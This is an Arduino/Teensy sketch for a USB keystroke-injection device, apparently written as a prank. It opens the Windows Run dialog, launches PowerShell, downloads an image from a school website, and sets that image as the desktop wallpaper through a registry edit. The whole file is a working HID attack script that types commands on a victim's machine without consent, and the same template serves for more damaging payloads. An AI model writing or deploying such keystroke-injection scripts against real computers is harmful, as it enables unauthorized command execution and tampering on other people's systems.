const int ledPin = 13;   
void setup() {
  Serial.begin(9600);

  // Blink the LED for 10 seconds, to give time to open 
  // a word processor or text editor to receive the test
  pinMode(ledPin, OUTPUT);
  for (int i=0; i < 5; i++) {
    digitalWrite(ledPin, HIGH);
    delay(500);
    digitalWrite(ledPin, LOW);
    delay(500);
  }

  /*
  for (int i=0; i < 10; i++) {
    Keyboard.press(KEY_A);
    Keyboard.release(KEY_A);
    delay(1000);
    
  }
  */

  Keyboard.press(MODIFIERKEY_GUI);
  Keyboard.press(KEY_R);
  Keyboard.release(KEY_R);
  Keyboard.release(MODIFIERKEY_GUI);
  delay(200);
  Keyboard.print("powershell");
  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(200);
  Keyboard.println("Invoke-WebRequest -Uri https://icn.lycee-valin.fr/projets2017/seconde13/eleve13/images/imaget.bmp -OutFile C:\temp\grizou.bmp");
  delay(1000);
  Keyboard.println("reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d C:\temp\grizou.bmp /f");
  Keyboard.println("rundll32.exe User32.dll,UpdatePerUserSystemParameters");

  //Keyboard.print("start chrome.exe https://static.hitek.fr/img/up_m/721767544/griezmann.gif");
  // reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\temp\grizou.bmp" /f & rundll32.exe User32.dll,UpdatePerUserSystemParameters
}

void loop() {
  // Do nothing after the test
}

/*
 * 
 */
